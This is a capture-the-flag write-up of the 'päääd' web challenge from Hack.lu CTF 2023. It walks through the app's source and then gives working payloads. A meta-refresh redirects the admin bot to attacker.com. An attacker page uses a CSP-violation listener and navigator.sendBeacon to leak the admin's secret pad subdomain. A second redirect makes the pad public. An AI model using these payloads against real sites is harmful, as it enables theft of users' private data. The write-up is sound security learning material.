+++
title = 'päääd - Hack.lu CTF 2023 '
date = 2024-05-26T13:07:55+05:30
draft = false
tags = ["writeups"]
+++

**tl;dr**

+ meta redirect to attacker website, using the html injection in the paaad.
+ leak the unique subdomain with csp violation.
+ Another meta redirect csrf with the leaked subdomain to make the note public.

<!--more-->

**No. of solves**: 5

## 🔎 Initial analysis

We are given the application source code and a challenge link. Also there is a ``bot.js`` for the admin bot. So it was some client side challenge. Looking at the application,  its main functionality was to create pads (basically notes ) and view them. There was html and markdown allowed in the contents of the pad.

Looking at the ``bot.js`` file .

```js 

    let page = await browser.newPage();

    // login 
    await page.goto(`https://${DOMAIN}/user/login`, { waitUntil: 'networkidle0' }); // wait until page load
    // generate admin creds
    await page.type('#username', ADMIN_USERNAME);
    await page.type('#password', ADMIN_PASSWORD);
    // click and wait for navigation
    await Promise.all([
        page.click('#submit'),
        page.waitForNavigation({ waitUntil: 'networkidle0' }),
    ]);

    // create flag pad
    await page.goto(`https://${DOMAIN}/p/new`, { waitUntil: 'networkidle0' }); // wait until page load
    await page.type('#title', 'flag');
    await page.type('#content', FLAG);
    // click and wait for navigation
    await Promise.all([
        page.click('#submit'),
        page.waitForNavigation({ waitUntil: 'networkidle0' }),
    ])


    // avoid leaking anything
    await page.close();
    page = await browser.newPage();

    page.on('console', (msg) => {
        console.log('[Console]', msg);
    });

    // open the link
    console.log(`Visiting URL: https://${padid}.${DOMAIN} `);
    await page.goto(`https://${padid}.${DOMAIN}`);

```
After looking at ``bot.js`` it's clear that the flag is in the admins pad. So we have to somehow steal the contents of the admins pad using XSS or using some other client side attack. But unfortunately, the content inside the pad is sanitized using the HTML Sanitizer API . So there is no chance for direct XSS to steal the admins pad.

```js 
    const markdown = (md) => {
        return md.replace(/__(.*?)__/gs, '<strong>$1</strong>')
            .replace(/_(.*?)_/gs, '<em>$1</em>')
            .replace(/## (.*?)\n/gs, '<h2>$1</h2>')
            .replace(/# (.*?)\n/gs, '<h1>$1</h1>')
            .replace(/!\[(.*?)\]\((.*?)\)/gs, '<img alt="$1" src="$2" />')
            .replace(/\[(.*?)\]\((.*?)\)/gs, '<a href="$2">$1</a>')
            .replace(/`(.*?)`/gs, '<code>$1</code>')
            .replace(/\n/gs, '<br>')
    }
    let md = markdown(padcontent.dataset.content)
    const sanitizer = new Sanitizer()

    padcontent.setHTML(md, { sanitizer })

```

Looking at the code to create pads at the ``/p/new`` endpoint. We can see that there is a cookie called latest being set with a unique_id.

```js

router.post('/p/new', ensureAuthenticated, async (req, res) => {
    let {title, content, isPublic, isTemp} = req.body

    let pad = new Pad({
        username: req.session.username,
        title,
        content,
        isPublic: isPublic ? true : false,
        createdAt: isTemp ? new Date() : undefined
    })
    console.log(pad)
    await pad.save()

    res.cookie('latest', {title, uniqueId: pad.uniqueId}, {
        secure: true,
        httpOnly: true,
        sameSite: 'none',
    })
    
    req.flash('success', 'Pad created.')
    return res.redirect('/')    
})
```

and the pad can be viewed by visiting that unique subdomain ``unique_id.paaad.space`` . Looking at the code for that.

```js 
router.get('/', ensureAuthenticated, async (req, res) => {
     // get id from subdomain
    let id = req.subdomains[0]
    // show the index page
    if(!id){
        let pads = await Pad.find({username: req.session.username})
        return res.render('index', {
            username: req.session.username,
            latest: req.cookies.latest,
            pads
        })
    }
    if (!/^[a-f0-9]{48}$/.test(id)){
        req.flash('danger', 'Invalid päääd id.')
        return res.redirect(`https://${process.env.DOMAIN}`)
    }

    // find pad with id 
    let pad = await Pad.findOne({uniqueId: id})
    
```

here it is taking the id from `` req.subdomains[0] `` and fetching the pad from the database with that id . so anyone with that unique id can view the contents of the pad, since there are no checks.

## 🥷 Attack plan

So if we can manage to somehow get the admin pads unique_id , we can access his pad. So the idea is to somehow leak this unique subdomain. There is another feature of this application that I found interesting, that allows you to view the latest note created by a user.

Looking at the code for that functionality.

```js 

router.get('/p/latest', async (req, res) => {
    if(!req.cookies.latest){
        req.flash('danger', 'No latest päääd.')
        return res.redirect('/')
    }
    let id = req.cookies.latest.uniqueId
    if (!/^[a-f0-9]{48}$/.test(id)){
        req.flash('danger', 'Invalid päääd id.')
        return res.redirect(`https://${process.env.DOMAIN}`)
    }
    return res.redirect(`https://${id}.${process.env.DOMAIN}`)
})
```

Basically, if we visit the endpoint ``/p/latest`` with the cookie latest, it will redirect to unique_id.paaad.space. So if we manage to somehow leak the subdomain from this redirection we can get the pad. 

The initial plan is to use csp violations to leak the subdomain. So to do that we have to first redirect the bot to our attacker's website. Since ``.setHTML()`` allows meta tags we can use a meta redirect to our attacker controlled website .

## CSP violation leak 🌟



If we put ``https://xn--pd-viaaa.space/p/latest `` in an iframe and then add a csp with   ``frame-src https://xn--pd-viaaa.space/p/latest `` it will trigger a csp violation , because ``https://xn--pd-viaaa.space/p/latest `` redirects to ``unique_id.xn--pd-viaaa.space`` . 

So using this technique we can leak the unique_id .


## CSRF to make the note public 🌟 
After getting the unique id there is still one more problem to solve. The admins pad is not public, so we can't access it directly due to this check.

```js 
if(!pad.isPublic && req.session.username != pad.username){
        req.flash('danger', 'Not allowed to access this non-public päääd.')
        return res.redirect(`https://${process.env.DOMAIN}`)
    }
```

The code to make the note public is as follows.

```js 
if(req.session.username == pad.username){
        if(req.query.edit=='isPublic'){
            pad.isPublic = !pad.isPublic
            await pad.save()
            return res.redirect(`https://${id}.${process.env.DOMAIN}`)
        }
        if(req.query.edit=='isTemp'){
            pad.createdAt = pad.createdAt ? undefined : new Date()
            await pad.save()
            return res.redirect(`https://${id}.${process.env.DOMAIN}`)
        }
    }
```

So we just have to make the admin send a get request using ?edit=isPublic to make the note public. But unfortunately, the session cookie is having ``sameSite: 'strict'`` . So doing a csrf to make the note public won't work. 

To overcome this we can run the bot twice, the first time to leak the unique_id and the next time with a pad that has a meta redirect to ``unique_id.xn--pd-viaaa.space?edit=isPublic`` to make the note public.

## 🚀  Final Payloads

``First pad``
```html
<!-- redirect to attacker site -->
<meta http-equiv="refresh" content="1; url=https://attacker.com/attacker.html">
```

``https://attacker.com/attacker.html``
```html 
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="frame-src 'self' xn--pd-viaaa.space;">
    <title>TEST</title>
</head>

<body>
    <script>
        document.addEventListener('securitypolicyviolation', async function (event) {
            console.log(event)
            navigator.sendBeacon(location.href,event.blockedURI)

        });      
    </script>
    <iframe src="https://päääd.space/p/latest"></iframe>
</body>

</html>
```
``Second pad``
```html
<!-- to make pad public-->
<meta http-equiv="refresh" content="1; url=unique_id.xn--pd-viaaa.space?edit=isPublic">
```
## 🚩 Flag

``flag{hmmmmmmmmmXDD} ``
